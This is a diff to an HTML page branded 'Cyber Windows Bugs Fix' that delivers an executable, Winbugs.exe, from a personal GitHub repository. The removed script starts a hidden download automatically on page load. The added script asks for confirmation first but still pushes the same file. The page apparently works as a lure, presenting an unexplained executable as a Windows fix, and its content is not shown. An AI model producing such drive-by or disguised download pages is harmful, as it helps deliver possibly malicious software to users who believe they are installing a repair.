@@ -28,24 +28,34 @@
         h1 {
             color: #0073e6;
         }
+        a {
+            color: #0073e6;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Cyber Windows Bugs Fix</h1>
-        <p>Your download will begin automatically. If it doesn't, please <a href="https://github.com/hubertloudgfdxgx/huber.github.io/raw/refs/heads/main/Winbugs.exe">click here</a>.</p>
+        <p>Your download will begin shortly. If it doesn't, please <a href="https://github.com/hubertloudgfdxgx/huber.github.io/raw/refs/heads/main/Winbugs.exe" download>click here</a>.</p>
     </div>
 
     <script>
-        // Trigger download automatically
+        // Ask user for confirmation before initiating download
         window.onload = function() {
-            const downloadLink = document.createElement('a');
-            downloadLink.href = "https://github.com/hubertloudgfdxgx/huber.github.io/raw/refs/heads/main/Winbugs.exe";
-            downloadLink.download = '';
-            downloadLink.style.display = 'none';
-            document.body.appendChild(downloadLink);
-            downloadLink.click();
-            document.body.removeChild(downloadLink);
+            const userConsent = confirm("Would you like to download the Cyber Windows Bugs Fix?");
+            if (userConsent) {
+                const downloadLink = document.createElement('a');
+                downloadLink.href = "https://github.com/hubertloudgfdxgx/huber.github.io/raw/refs/heads/main/Winbugs.exe";
+                downloadLink.download = 'Winbugs.exe';
+                downloadLink.style.display = 'none';
+                document.body.appendChild(downloadLink);
+                downloadLink.click();
+                document.body.removeChild(downloadLink);
+            }
         };
     </script>
 </body>
